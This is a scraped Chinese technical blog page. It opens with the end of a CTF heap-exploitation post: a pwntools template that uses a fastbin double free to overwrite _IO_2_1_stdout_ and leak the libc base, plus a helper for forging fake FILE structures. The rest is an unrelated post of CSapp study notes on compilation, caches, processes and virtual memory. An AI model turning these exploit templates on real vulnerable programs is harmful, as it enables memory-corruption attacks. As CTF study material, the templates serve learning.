<p>导致程序误以为chunk0(free)是chunk2相邻的上一个chunk，在释放chunk2后，会导致chunk0，chunk1，chunk2，三者合并为free_chunk</p>
<p>两次申请“0x80”大小的chunk后，free_chunk刚好和chunk1_old重合，把“arena_main + xx”写入chunk1_old，这之后就可以利用“打印模块”进行泄露了</p>
<h2 id="IO-2-1-stdout-Leak-模板"><a href="#IO-2-1-stdout-Leak-模板" class="headerlink" title="IO_2_1_stdout Leak 模板"></a>IO_2_1_stdout Leak 模板</h2><p><strong>基于 Double free</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span>	</span><br><span class="line">    <span class="comment"># lead target to chunk2</span></span><br><span class="line">    add(<span class="number">0x60</span>) <span class="comment"># chunk0</span></span><br><span class="line">	add(<span class="number">0x90</span>) <span class="comment"># chunk1</span></span><br><span class="line">	add(<span class="number">0x60</span>) <span class="comment"># chunk2</span></span><br><span class="line">	delete(<span class="number">1</span>)</span><br><span class="line">	_IO_2_1_stdout_s = libc.symbols[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br><span class="line">	add(<span class="number">0x90</span>,p16((<span class="number">2</span> &lt;&lt; <span class="number">12</span>) + ((_IO_2_1_stdout_s-<span class="number">0x43</span>) &amp; <span class="number">0xFFF</span>))) </span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Double free to leak libc_base</span></span><br><span class="line">	delete(<span class="number">0</span>)</span><br><span class="line">	delete(<span class="number">2</span>)</span><br><span class="line">	delete(<span class="number">0</span>)</span><br><span class="line">	add(<span class="number">0x60</span>,padding) <span class="comment"># cover &quot;chunk0-&gt;FD&quot; to make chunk1 into fastbin</span></span><br><span class="line">	add(<span class="number">0x60</span>) <span class="comment"># can change</span></span><br><span class="line">	add(<span class="number">0x60</span>)</span><br><span class="line">	add(<span class="number">0x60</span>)</span><br><span class="line">	add(<span class="number">0x60</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x33</span>+p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">&#x27;\x00&#x27;</span>) <span class="comment"># malloc the target</span></span><br><span class="line">	libc_base=u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-offset</span><br></pre></td></tr></table></figure>
<ul>
<li>整个过程在循环中进行，有 1/16 的概率可以成功</li>
<li>把 chunk1 放入 unsortedbin 然后覆盖 main_arena 为 target</li>
<li>进行 Double free ，然后覆盖“chunk0-&gt;FD”，使其指向 chunk1</li>
<li>申请 target 修改 <code>_IO_2_1_stdout_</code> 的“flag”为“0xfbad1800”，将后面三个read指针置空，将 <code>_IO_write_base</code> 处的第一个字节改为“0”</li>
</ul>
<p>这里一定是：先覆盖 main_arena ，后 Double free 把它链入 fastbin</p>
<h2 id="FILE结构体模板"><a href="#FILE结构体模板" class="headerlink" title="FILE结构体模板"></a>FILE结构体模板</h2><p>这个模板主要是个函数：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">FILE</span>(<span class="params">_flags=<span class="number">0</span>,_IO_read_ptr=<span class="number">0</span>,_IO_read_end=<span class="number">0</span>,_IO_read_base=<span class="number">0</span>,_IO_write_base=<span class="number">0</span>,_IO_write_ptr=<span class="number">0</span>,_IO_write_end=<span class="number">0</span>,_IO_buf_base=<span class="number">0</span>,_IO_buf_end=<span class="number">1</span>,_fileno=<span class="number">0</span>,_chain=<span class="number">0</span></span>):</span></span><br><span class="line">	fake_IO = flat([</span><br><span class="line">	_flags,</span><br><span class="line">	_IO_read_ptr, _IO_read_end, _IO_read_base,</span><br><span class="line">	_IO_write_base, _IO_write_ptr, _IO_write_end,</span><br><span class="line">	_IO_buf_base, _IO_buf_end])</span><br><span class="line">	fake_IO += flat([<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,_chain,_fileno])</span><br><span class="line">	fake_IO += flat([<span class="number">0xFFFFFFFFFFFFFFFF</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0xFFFFFFFFFFFFFFFF</span>,<span class="number">0</span>,<span class="number">0</span>])</span><br><span class="line">	fake_IO += flat([<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0xFFFFFFFF</span>,<span class="number">0</span>,<span class="number">0</span>])</span><br><span class="line">	<span class="keyword">return</span> fake_IO</span><br></pre></td></tr></table></figure>
<p>用它可以快速伪造 FILE 结构体</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/" class="post-title-link" itemprop="url">从CSapp中收获的知识（持续更新）</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-01-01 02:25:43" itemprop="dateCreated datePublished" datetime="2022-01-01T02:25:43+08:00">2022-01-01</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-05-18 23:47:48" itemprop="dateModified" datetime="2022-05-18T23:47:48+08:00">2022-05-18</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Knowledge/" itemprop="url" rel="index"><span itemprop="name">Knowledge</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>32k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>29 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="从CSapp中收获的知识"><a href="#从CSapp中收获的知识" class="headerlink" title="从CSapp中收获的知识"></a>从CSapp中收获的知识</h2><p><strong>CSapp</strong>是一本很好的书，它像极了一本“技术字典”，知识十分全面但又不深入，对学习计算机有着引领性的作用</p>
<p>我学习<strong>CSapp</strong>已经有一段时间了，有些章节可以调起我的兴趣，使我在网络上进行了知识扩充，但有些章节用大段大段的文字来劝退我，甚至还有一些章节玩起了“高数”，搞得我很懵逼</p>
<p><strong>CSapp</strong>上的知识太杂，太广，我感觉好多知识我都没法利用上（或许以后用得上），我害怕搞忘了这些知识，于是我也做过章节总结，但是我发现这样做的效率并不高，所以我打算不以章节为单位进行总结，而是把知识拆分为小块，逐一记录</p>
<hr>
<h2 id="栈帧"><a href="#栈帧" class="headerlink" title="栈帧"></a>栈帧</h2><img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1641111569636-1646286364492-1646808754595-1646808862601.png" class width="1641111569636"> 
<h2 id="程序执行流程"><a href="#程序执行流程" class="headerlink" title="程序执行流程"></a>程序执行流程</h2><img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1639405451872-1640399662182-1640976664503-1646286364492-1646808754595-1646808862601.png" class width="1639405451872"> 
<p>文字版本如下：</p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1640400471882-1640976664503-1646286364492-1646808754595-1646808862601.png" class width="1640400471882"> 
<h2 id="编译器驱动程序"><a href="#编译器驱动程序" class="headerlink" title="编译器驱动程序"></a>编译器驱动程序</h2><p>编译器驱动程序的工作：调用语言预处理器，编译器，汇编器，链接器</p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1641118618666-1646286364492-1646808754595-1646808862601.png" class width="1641118618666"> 
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1646665002297-1646808754595-1646808862601.png" class width="1646665002297"> 
<p>详细过程：</p>
<ul>
<li><strong>预处理阶段</strong>：预处理器（cpp）根据以字符 “#” 开头的命令，修改原始的 C 程序（比如 hello.c 中第 1 行的<code>#include</code>命令告诉预处理器读取系统头文件 stdio.h 的内容）并把它直接插入程序文本中，结果就得到了另一个 C 程序<ul>
<li>通常是以 .i 作为文件扩展名</li>
<li>所谓的头文件，里面装的其实就是函数声明（libc库中的函数：scanf，printf 等）</li>
</ul>
</li>
<li><strong>编译阶段</strong>：编译器（ccl）将文本文件 hello.i 翻译成文本文件 hello.s，它包含一个汇编语言程序<ul>
<li>.s 文件其实就是装有汇编语言的文件</li>
</ul>
</li>
<li><strong>汇编阶段</strong>：汇编器（as）将 hello.s 翻译成机器语言指令，把这些指令打包成一种叫做可重定位目标程序（relocatable object program）的格式，并将结果保存在目标文件 hello.o 中<ul>
<li>hello.o 文件是一个二进制文件，它包含的 17 个字节是函数 main 的指令编码</li>
<li>如果我们在文本编辑器中打开 hello.o文件，将看到一堆乱码（二进制）</li>
</ul>
</li>
<li><strong>链接阶段</strong>：链接器（ld）就负责处理合并各个 hello.o 文件，结果就得到 hello 文件，它是一个可执行目标文件（或者简称为可执行文件），可以被加载到内存中，由系统执行<ul>
<li>请注意，hello 程序调用了 printf 函数，它是每个 C 编译器都提供的标准 C 库中的一个函数</li>
<li>printf 函数存在于一个名为 printf.o 的单独的预编译好了的目标文件中，而这个文件必须以某种方式合并到我们的 hello.o 程序中</li>
<li>通过修改 hello.o 可以影响最终文件 hello 的效果</li>
</ul>
</li>
</ul>
<h2 id="抽象"><a href="#抽象" class="headerlink" title="抽象"></a>抽象</h2><p>抽象是从众多的事物中抽取出共同的、本质性的<strong>特征</strong></p>
<p><strong>指令集架构</strong>是对 <strong>实际处理器硬件</strong> 的抽象</p>
<p><strong>文件</strong>是对 <strong>I/O设备</strong> 的抽象</p>
<p><strong>虚拟内存</strong>是对 <strong>程序存储器</strong> 的抽象</p>
<p><strong>虚拟机</strong>是对 <strong>整个计算机</strong> 的抽象</p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1639413250532-1640976664503-1646286364492-1646808754595-1646808862601.png" class width="1639413250532"> 
<h2 id="缓存"><a href="#缓存" class="headerlink" title="缓存"></a>缓存</h2><p><strong>缓存</strong>（cache），原始意义是指访问速度比一般随机存取存储器（RAM）快的一种高速存储器，通常它不像系统主存那样使用 <strong>[DRAM]技术</strong> ，而使用昂贵但较快速的 <strong>[SRAM]技术</strong> ，缓存的设置是所有现代计算机系统发挥高性能的重要因素之一</p>
<p>缓存的工作原理是当CPU要读取一个数据时，首先从CPU缓存中查找，找到就立即读取并送给CPU处理，没有找到，就从速率相对较慢的内存中读取并送给CPU处理 </p>
<p><strong>缓存命中</strong></p>
<p>但程序需要在第 <strong>n</strong> 层中查找数据时：它会首先在第 <strong>n-1</strong> 层中查找， 如果数据刚好就在第 <strong>n-1</strong> 层中，就直接使用第 <strong>n-1</strong> 层中的数据，称为<strong>缓存命中</strong></p>
<p>从第 <strong>n-1</strong> 层中读取，要比从第 <strong>n</strong> 层中读取更快</p>
<p><strong>缓存不命中</strong></p>
<p>另一方面，如果程序没有在第 <strong>n-1</strong> 层中查找到数据，那么它便会在第 <strong>n</strong> 层中查找，称为<strong>缓存不命中</strong>，同时会把第 <strong>n</strong> 层的数据写入第 <strong>n-1</strong> 层</p>
<h2 id="内存阶层"><a href="#内存阶层" class="headerlink" title="内存阶层"></a>内存阶层</h2><p>速度快的存储器往往容量小，容量大的储存器往往速度慢</p>
<p>所以综合存储器的优劣，内存阶层的机制出现了</p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1641115585515-1646286364492-1646808754595-1646808862601.png" class width="1641115585515"> 
<p>核心思想为：上一层（更快更小）为下一层（更大更慢）的缓存</p>
<p>内存阶层是在电脑架构下储存系统阶层的排列顺序，每一层于下一层相比都拥有较高的速度和较低延迟性，以及较小的容量（也有少量例外）</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>类型</th>
<th style="text-align:left"><strong>位于哪里</strong></th>
<th style="text-align:left"><strong>存储容量</strong></th>
<th style="text-align:left"><strong>访问时间</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>CPU寄存器</td>
<td style="text-align:left">位于CPU执行单元中</td>
<td style="text-align:left">CPU寄存器通常只有几个到几十个，每个寄存器的容量取决于CPU的字长，所以一共只有几十到几百字节</td>
<td style="text-align:left">寄存器是访问速度最快的存储器，典型的访问时间是几纳秒</td>
</tr>
<tr>
<td>Cache</td>
<td style="text-align:left">和MMU一样位于CPU核中</td>
<td style="text-align:left">Cache通常分为几级，最典型的是如上图所示的两级Cache，一级Cache更靠近CPU执行单元，二级Cache更靠近物理内存，通常一级Cache有几十到几百KB，二级Cache有几百KB到几MB</td>
<td style="text-align:left">典型的访问时间是几十纳秒</td>
</tr>
<tr>
<td>内存</td>
<td style="text-align:left">位于CPU外的芯片，与CPU通过地址和数据总线相连</td>
<td style="text-align:left">典型的存储容量是几百MB到几GB</td>
<td style="text-align:left">典型的访问时间是几百纳秒</td>
</tr>
<tr>
<td>硬盘</td>
<td style="text-align:left">位于设备总线上，并不直接和CPU相连，CPU通过设备总线的控制器访问硬盘</td>
<td style="text-align:left">典型的存储容量是几百GB</td>
<td style="text-align:left">典型的访问时间是几毫秒，是寄存器的“10的6次方”倍</td>
</tr>
</tbody>
</table>
</div>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1641117200100-1646286364492-1646808754595-1646808862601.png" class width="1641117200100"> 
<h2 id="管理单元"><a href="#管理单元" class="headerlink" title="管理单元"></a>管理单元</h2><p>计算机常用“扇区”，“簇”，“块”，“页”等概念，这些都是<strong>管理单元</strong></p>
<p><strong>扇区：</strong>（Sector）</p>
<p>扇区，顾名思义，每个磁盘有多条同心圆似的磁道，磁道被分割成多个部分，每部分的弧长加上到圆心的两个半径，恰好形成一个扇形，所以叫做扇区 </p>
<p>扇区是磁盘中最小的物理存储单位（每个扇区的大小是512字节，通常4096字节）</p>
<p><strong>块：</strong>（Block）</p>
<p>块是操作系统中最小的逻辑存储单元（例如内存块的基本组成单元：chunk）</p>
<p><strong>簇：</strong></p>
<p>簇是微软操作系统（DOS、WINDOWS等）中磁盘文件存储管理的最小单位 </p>
<p><strong>块和簇的关系：</strong></p>
<p>在Windows下如NTFS等文件系统中叫做簇</p>
<p>在Linux下如Ext4等文件系统中叫做块</p>
<p>每个簇或者块可以包括2、4、8、16、32、64… “2的n次方” 个扇区 </p>
<p><strong>页：</strong>（page）</p>
<p>页是内存的最小存储单位，页的大小通常为磁盘块大小的 “2的n次方” 倍，是内存操作的基本单位 </p>
<h2 id="操作系统"><a href="#操作系统" class="headerlink" title="操作系统"></a>操作系统</h2><p>操作系统有两目的：</p>
<p>1.防止硬件被失控的应用滥用</p>
<p>2.向应用程序提供简单一致的机制来控制复杂的低级硬件</p>
<p>操作系统通过几个基本的<strong>抽象</strong>概念来实现这两个功能：</p>
<p>1.<strong>文件</strong>是对 <strong>I/O设备</strong> 的抽象</p>
<p>2.<strong>虚拟内存</strong>是对 <strong>程序存储器</strong> 的抽象</p>
<p>3.<strong>进程</strong>是对 <strong>处理器，内存，I/O设备</strong> 的抽象</p>
<h2 id="程序计数器-PC"><a href="#程序计数器-PC" class="headerlink" title="程序计数器(PC)"></a>程序计数器(PC)</h2><p>程序计数器（PC）是CPU控制部件中的一种，用于存放指令的地址 </p>
<p>程序计数器是一个概念上的说法，<strong>不同的机型把不同的存储器当成程序计数器</strong></p>
<ul>
<li>8086：IP寄存器  </li>
<li>i386：EIP寄存器</li>
<li>amd64：RIP寄存器</li>
</ul>
<h2 id="上下文切换"><a href="#上下文切换" class="headerlink" title="上下文切换"></a>上下文切换</h2><p>内核可以决定抢占当前进程，并重新开始一个被抢占的进程，这种决策叫做<strong>调度</strong>，是由内核中被称为“调度器”的代码处理的</p>
<p><strong>上下文切换机制</strong>用于：保存“被调度进程”的数据</p>
<h2 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h2><p>当程序在系统上运行时，操作系统会提供一种 <strong>假象</strong> ，就好像系统上只有这个程序在运行一样，程序看上去是在 <strong>独占</strong> 处理器（该程序是系统资源中唯一的对象）</p>
<p>这些 <strong>假象</strong> 是通过 <strong>进程</strong> 这个概念来实现的</p>
<p>​        //在系统中，各种程序交替执行，而 <strong>进程</strong> 把不同功能的程序 <strong>区分</strong> 开来</p>
<p>在单处理器系统中：</p>
<p>程序想要“并发处理多个进程”时，必须要先保存当前进程的 <strong>上下文</strong> ，然后创建新进程的 <strong>上下文</strong></p>
<p>比如“hello”执行的过程就涉及到两个进程：1.shell    2.hello</p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1639410149675-1640976664503-1646286364492-1646808754595-1646808862601.png" class width="1639410149675"> 
<p>系统中的每个程序都运行在某个进程的上下文中，上下文就是程序正确运行所需要的状态（包括：存放在内存中的代码和数据，栈和通用寄存器中的内容，程序计数器，环境变量，打开文件描述符的集合）</p>
<p>进程将会提供给应用程序两个关键的抽象：</p>
<ul>
<li>逻辑控制流</li>
<li>私有地址空间</li>
</ul>
<h2 id="逻辑控制流"><a href="#逻辑控制流" class="headerlink" title="逻辑控制流"></a>逻辑控制流</h2><img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1641872879336-1646286364492-1646808754596-1646808862601.png" class width="1641872879336"> 
<p>实际上：系统中的进程是<strong>交错运行</strong>的，每个进程执行它流的一部分，然后被抢占（暂时挂起），接着轮到其他进程</p>
<p>进程提供的假象：好像每个程序都在<strong>单独地</strong>使用处理器</p>
<p>这种假象就是：逻辑控制流，它仿佛可以控制程序的逻辑行为，一步一步的流向，可以使用<strong>流程图</strong>来表现这种行为的流动，方便了调试人员对程序执行流程的把控</p>
<h2 id="并发流"><a href="#并发流" class="headerlink" title="并发流"></a>并发流</h2><p>系统中的逻辑流有多种不同的形式：异常处理，进程，信号处理，线程，java进程……</p>
<p>并发流：在时间上，一个逻辑流和另一个逻辑流冲突，这两个流并发运行</p>
<p>并发：多条流在同时执行的一般现象</p>
<p>多任务（时间分片）：多个进程流量执行的现象</p>
<h2 id="私有地址空间"><a href="#私有地址空间" class="headerlink" title="私有地址空间"></a>私有地址空间</h2><p>私有地址空间也是进程提供的假象，好像程序在单独地使用系统地址空间一样</p>
<p>​        // 私有地址空间是虚拟内存的子集</p>
<p>每个进程都会为所对应的程序提供一份“私有地址空间”，每个“私有地址空间”完全一致，并且只能被所对应的程序访问</p>
<h2 id="进程控制"><a href="#进程控制" class="headerlink" title="进程控制"></a>进程控制</h2><p>Unix提供了大量从C程序中操作进程的系统调用</p>
<h2 id="僵死进程"><a href="#僵死进程" class="headerlink" title="僵死进程"></a>僵死进程</h2><p>当一个进程因为某种原因终止后，内核并不会马上把它清除，而是等待它的父进程把它回收</p>
<p>一个终止了但是还没有被回收的进程被称为<strong>僵死进程</strong></p>
<p>如果一个进程的父进程终止了，内核会安排“init进程”成为它的“养父”（代替父进程回收子进程）</p>
<p>​        // “init进程”的PID为“1”，“调度进程”（系统进程）的PID为“0”</p>
<h2 id="PID算法"><a href="#PID算法" class="headerlink" title="PID算法"></a>PID算法</h2><p>PID，就是“比例（proportional）、积分（integral）、微分（derivative）” </p>
<p>PID控制应该算是应用非常广泛的控制算法，小到控制一个元件的温度，大到控制无人机的飞行姿态和飞行速度等等，都可以使用PID控制。这里我们从原理上来理解PID控制</p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1642074027298-1646286364492-1646808754596-1646808862601.png" class> 
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1642074041508-1646286364492-1646808754596-1646808862601.png" class width="1642074041508"> 
<h2 id="线程"><a href="#线程" class="headerlink" title="线程"></a>线程</h2><p>线程（英语：thread）是操作系统能够进行<strong>运算调度</strong>的最小单位 </p>
<p>线程被包含在进程之中，是进程中的实际运作单位 </p>
<p>​        // <strong>多线程</strong> 比 <strong>多进程</strong> 跟高效 </p>
<h2 id="虚拟内存"><a href="#虚拟内存" class="headerlink" title="虚拟内存"></a>虚拟内存</h2><p>虚拟内存为每个进程提供了一个<strong>假象</strong></p>
<p>就好像每个进程在<strong>单独占用</strong>内存空间一样，每个进程中看到的内存是一样的（虚拟地址空间）</p>
<p>即：该进程是系统资源中唯一的对象</p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1639410537327-1640976664503-1646286364492-1646808754596-1646808862602.png" class width="1639410537327">   
<p>物理内存是不连续的，但是操作系统完成了“使内存看起来是连续的”这样一份抽象，创造了 <strong>虚拟内存</strong> ，并且为虚拟内存中的各个空间进行了编号</p>
<ul>
<li>虚拟内存<strong>用户空间</strong>每个进程各一份</li>
<li>虚拟内存<strong>内核空间</strong>所有进程共享一份</li>
<li>虚拟内存 mmap 段中的<strong>动态链接库</strong>仅在物理内存中装载一份</li>
</ul>
<p><strong>虚拟内存的作用</strong></p>
<p>硬件只能识别“物理地址”，而“物理地址”是不连续的并且不方便显示，这就给调试程序带来了巨大的影响</p>
<p>所以操作系统抽象出了“虚拟内存”，把硬件中的数据映射到“虚拟内存”中，方便了调试</p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1641630776102-1646286364493-1646808754596-1646808862602.png" class width="1641630776102">  
<h2 id="虚拟内存作为缓存工具"><a href="#虚拟内存作为缓存工具" class="headerlink" title="虚拟内存作为缓存工具"></a>虚拟内存作为缓存工具</h2><p>VM系统（虚拟程序系统）将虚拟内存分割成块，这些块被称为虚拟页</p>
<p>每个虚拟页的大小为“P = 2的p次方”字节，类似地，物理内存被分割为物理页，大小也为P字节（物理页也被称为“页帧”）</p>
<p>在任意时刻，虚拟页面的集合都分为3个不相交的子集：</p>
<ul>
<li>未分配的：VM系统还未分配的页，没有数据和它们相关，不占用磁盘空间</li>
<li>缓存的：当前已缓存在物理内存中的已分配页</li>
<li>未缓存的：当前未缓存在物理内存中的已分配页</li>
</ul>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1644400609758-1646657383403-1646808754596-1646808862602.png" class width="1644400609758"> 
<h2 id="Proc文件系统"><a href="#Proc文件系统" class="headerlink" title="Proc文件系统"></a>Proc文件系统</h2><p>Proc文件系统是一个伪文件系统，它只存在于内存中（不占用外存空间），允许“用户模式进程”访问“内核数据结构”的内容</p>
<p>Proc文件系统将许多“内核数据结构”的内容输出为一个用户程序可以读的“文本文件”</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ /proc/cpuinfo				<span class="comment"># 输出CPU属性</span></span><br></pre></td></tr></table></figure>
<h2 id="Unix-I-O"><a href="#Unix-I-O" class="headerlink" title="Unix I/O"></a>Unix I/O</h2><p>一个 Linux 文件就是一个 m 个字节的序列，所有的 I/O 设备（例如网络、磁盘和终端）都被模型化为文件，而所有的输入和输出都被当作对相应文件的读和写来执行</p>
<p>这种将设备优雅地映射为文件的方式，允许 Linux 内核引出一个简单、低级的应用接口，称为 Unix I/O，这使得所有的输入和输出都能以一种统一且一致的方式来执行：</p>
<ul>
<li><strong>打开文件</strong>：一个应用程序通过要求内核打开相应的文件，来宣告它想要访问一个 I/O 设备，内核返回一个小的非负整数，叫做 <strong>描述符</strong> ，它在后续对此文件的所有操作中标识这个文件，内核记录有关这个打开文件的所有信息，应用程序只需记住这个描述符</li>
<li><strong>改变当前的文件位置</strong>：对于 <strong>每个打开的文件</strong> ，内核保持着一个 <strong>文件位置</strong>（符号为 k），初始为 0，这个文件位置是 <strong>从文件开头起始的字节偏移量（相当于“指向”内存中文件末尾的一个标记，也可以用来记录该文件在内存中的大小）</strong>，应用程序能够通过执行 seek 操作，显式地设置文件的当前位置为 k</li>
<li><strong>读写文件</strong>：一个读操作就是 <strong>从文件复制 n &gt; 0 个字节到内存（从当前文件位置 k 开始，然后将 k 增加到 k+n）</strong> ，假设给定一个大小为 m 字节的文件，当 k&gt;=m 时（文件被完全读入内存）会触发一个称为 end-of-file（EOF）的条件，应用程序能检测到这个条件，在文件结尾处并没有明确的“EOF符号”，类似地，写操作就是 <strong>从内存复制 n &gt; 0 个字节到一个文件）从当前文件位置 k 开始，然后更新 k）</strong></li>
<li><strong>关闭文件</strong>：当应用完成了对文件的访问之后，它就通知内核关闭这个文件，作为响应，<strong>内核释放文件打开时创建的数据结构，并将这个描述符恢复到可用的描述符池中</strong>，无论一个进程因为何种原因终止时，内核都会关闭所有打开的文件并释放它们的内存资源</li>
</ul>
<p>Linux shell 创建的每个进程开始时都有三个打开的文件：<strong>标准输入</strong>（描述符为 0）、<strong>标准输出</strong>（描述符为 1）和 <strong>标准错误</strong>（描述符为 2），头文件  定义了常量 STDIN_FILENO、STDOUT_FILENO 和 STDERR_FILENO，它们可用来代替显式的描述符值</p>
<h2 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h2><p>文件就是 <strong>字节序列</strong></p>
<p>系统中所有的输入输出都是通过使用 <strong>Unix I/O</strong> 的 <strong>系统函数</strong> 来实现的，文件向应用程序提供了一个 <strong>统一的视图</strong> ，来看待系统中可能含有的各种形式的 <strong>I/O设备</strong>，在linux操作系统中有一个思想“一切皆文件”，即使是内存中的进程都可以被当成文件输出</p>
<p>每个 Linux 文件都有一个 <strong>类型</strong>（type）来表明它在系统中的角色： </p>
<ul>
<li><strong>普通文件</strong>（regular file）：包含任意数据，应用程序常常要区分 <strong>文本文件</strong> 和 <strong>二进制文件 </strong> ，文本文件是只含有 ASCII 或 Unicode 字符的普通文件，二进制文件是所有其他的文件<ul>
<li>对内核而言，文本文件和二进制文件没有区别</li>
<li>Linux 文本文件包含了一个 <strong>文本行</strong>（text line）序列，其中每一行都是一个字符序列，以一个新行符（“\n”）结束</li>
<li>新行符与 ASCII 的换行符（LF）是一样的，其数字值为 0x0a</li>
</ul>
</li>
<li><strong>目录</strong>（directory）：是包含一组 <strong>链接</strong> 的文件，其中每个链接都将一个 <strong>文件名</strong> 映射到一个文件，这个文件可能是另一个目录<ul>
<li>每个目录至少含有两个条目：是到该目录自身的链接，以及是到目录层次结构中 <strong>父目录</strong> 的链接</li>
<li>你可以用 mkdir 命令创建一个目录，用 Is 查看其内容，用 rmdir 删除该目录</li>
</ul>
</li>
<li><strong>套接字</strong>（socket）：是用来与另一个进程进行跨网络通信的文件</li>
</ul>
<p>其他文件类型包含 <strong>命名通道</strong> （named pipe）、  <strong>符号链接</strong> （symbolic link），以及 <strong>字符和块设备</strong> （character and block device）</p>
<h2 id="RIO-健壮地读写"><a href="#RIO-健壮地读写" class="headerlink" title="RIO-健壮地读写"></a>RIO-健壮地读写</h2><p>我们会讲述一个 I/O 包，称为 RIO（Robust I/O，健壮的 I/O）包，它会自动为你处理上文中所述的不足值，在像网络程序这样容易出现不足值的应用中，RIO 包提供了方便、健壮和高效的 I/O</p>
